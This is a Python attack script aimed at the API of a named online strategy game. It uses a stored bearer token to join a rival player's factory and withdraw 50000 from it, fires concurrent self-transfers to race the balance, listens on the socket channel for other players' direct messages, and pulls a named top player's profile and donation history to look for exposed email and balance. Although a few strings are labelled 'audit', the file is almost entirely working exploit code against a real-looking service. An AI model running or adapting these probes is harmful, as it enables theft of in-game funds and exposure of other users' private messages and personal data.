#!/usr/bin/env python3
"""Phase 2: leave factory -> join rival, socket DM leak, self-transfer race."""
import json
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

AUTH = Path("/root/diplomacia-auth.json")
BASE = "https://diplomacia.com.tr/api"
DELAY = 2.5
OUT = Path(__file__).resolve().parents[1] / "output" / "reverse"


def load():
    a = json.loads(AUTH.read_text())
    return a["token"], a["player_id"]


def api(method, path, token, body=None):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://diplomacia.com.tr",
        "User-Agent": "Mozilla/5.0",
    }
    data = json.dumps(body).encode() if body is not None else None
    time.sleep(DELAY)
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {"raw": "parse fail"}


def factory_idor_after_leave(token, my_id):
    results = []
    # Own work status
    st, ws = api("GET", "/factories/work-status", token)
    results.append({"step": "work_status_before", "status": st, "data": ws})

    # Leave current employment if any
    fid_employed = (ws.get("factory") or {}).get("factory_id") or ws.get("factory_id")
    if ws.get("working") and fid_employed:
        st, r = api("POST", "/factories/leave", token, {})
        results.append({"step": "leave", "status": st, "data": r})
        st2, ws2 = api("GET", "/factories/work-status", token)
        results.append({"step": "work_status_after_leave", "status": st2, "data": ws2})

    # Find rival factory
    st, wars = api("GET", "/wars", token)
    rival = None
    for w in wars.get("wars", []):
        rival = w.get("declared_by")
        if rival and rival != my_id:
            break
    if not rival:
        return results + [{"error": "no rival"}]

    st, fac = api("GET", f"/factories/player/{rival}", token)
    fid = fac.get("factories", [{}])[0].get("id") if fac.get("factories") else None
    results.append({"step": "rival_factory", "rival": rival, "factory_id": fid})

    if fid:
        st, r = api("POST", "/factories/join", token, {"factory_id": fid})
        results.append({"step": "join_rival", "status": st, "data": r, "exploit": st == 200 and not r.get("error")})

        st, r = api("POST", "/factories/work", token, {})
        results.append({"step": "work_after_join", "status": st, "data": str(r)[:400]})

        st, r = api("POST", "/factories/withdraw", token, {"factory_id": fid, "amount": 50000})
        results.append({"step": "withdraw_rival", "status": st, "data": r, "exploit": st == 200})

        st, r = api("POST", "/factories/leave", token, {})
        results.append({"step": "leave_rival", "status": st, "data": r})

    return results


def transfer_self_race(token, my_id):
    before_st, before = api("GET", "/players/profile", token)
    bal = before.get("player", {}).get("balance", 0)
    outcomes = []
    barrier = threading.Barrier(6)

    def send(i):
        try:
            barrier.wait(timeout=5)
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            body = json.dumps({"recipient_id": my_id, "amount": 100}).encode()
            req = urllib.request.Request(BASE + "/transfer/send", data=body, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=20) as r:
                outcomes.append({"t": i, "status": r.status, "body": r.read().decode()[:120]})
        except urllib.error.HTTPError as e:
            outcomes.append({"t": i, "status": e.code, "body": e.read().decode()[:120]})
        except Exception as ex:
            outcomes.append({"t": i, "error": str(ex)})

    threads = [threading.Thread(target=send, args=(i,)) for i in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    time.sleep(DELAY)
    _, after = api("GET", "/players/profile", token)
    bal2 = after.get("player", {}).get("balance", 0)
    return {"balance_before": bal, "balance_after": bal2, "delta": bal2 - bal, "outcomes": outcomes}


def socket_leak_probe(token, my_id):
    import socketio

    captured = []
    sio = socketio.Client(logger=False, engineio_logger=False)

    @sio.event
    def connect():
        captured.append("connected")

    for ev in ["dm_message", "conf_message", "revolution", "country_announcement", "global_message"]:
        sio.on(ev)(lambda d, e=ev: captured.append({"event": e, "preview": str(d)[:400]}))

    sio.connect("https://diplomacia.com.tr", auth={"token": token, "lang": "tr"}, transports=["polling"], wait_timeout=20)
    time.sleep(2)
    # Try subscribe to foreign country / DM sniff
    top_id = "6a3043a9-4408-4a65-b2e4-b474bd5f94a0"  # UhtreD
    for emit_ev, payload in [
        ("dm_send", {"recipient_id": top_id, "message": "audit-dm-probe"}),
        ("conf_send", {"message": "audit-conf-probe"}),
        ("global_message", {"message": "audit-global-2"}),
    ]:
        try:
            sio.emit(emit_ev, payload)
            captured.append({"emit": emit_ev, "payload": payload})
        except Exception as ex:
            captured.append({"emit_error": emit_ev, "error": str(ex)})
    time.sleep(5)
    sio.disconnect()
    # Check if we received DMs not for us
    foreign_dm = [x for x in captured if isinstance(x, dict) and x.get("event") == "dm_message"
                  and my_id not in str(x.get("preview", ""))]
    return {"captured_count": len(captured), "foreign_dm_leak": len(foreign_dm) > 0, "events": captured[:20]}


def top_player_sensitive(token):
    pid = "6a3043a9-4408-4a65-b2e4-b474bd5f94a0"
    endpoints = [
        f"/players/{pid}",
        f"/players/{pid}/donation-history",
        "/players/profile",
    ]
    out = {}
    for ep in endpoints:
        st, data = api("GET", ep, token)
        out[ep] = {"status": st}
        if isinstance(data, dict):
            if "player" in data:
                p = data["player"]
                out[ep]["has_email"] = "email" in p
                out[ep]["has_balance"] = "balance" in p
                out[ep]["keys"] = list(p.keys())
            if "donations" in data or "history" in data:
                sample = json.dumps(data)[:500]
                out[ep]["sample"] = sample
    return out


def main():
    token, my_id = load()
    report = {
        "factory_idor_v2": factory_idor_after_leave(token, my_id),
        "transfer_race_self": transfer_self_race(token, my_id),
        "socket_leak": socket_leak_probe(token, my_id),
        "top1_sensitive": top_player_sensitive(token),
    }
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "phase2_probe.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps({k: (v if not isinstance(v, list) else v[:3]) for k, v in report.items()}, indent=2, ensure_ascii=False)[:3000])


if __name__ == "__main__":
    main()
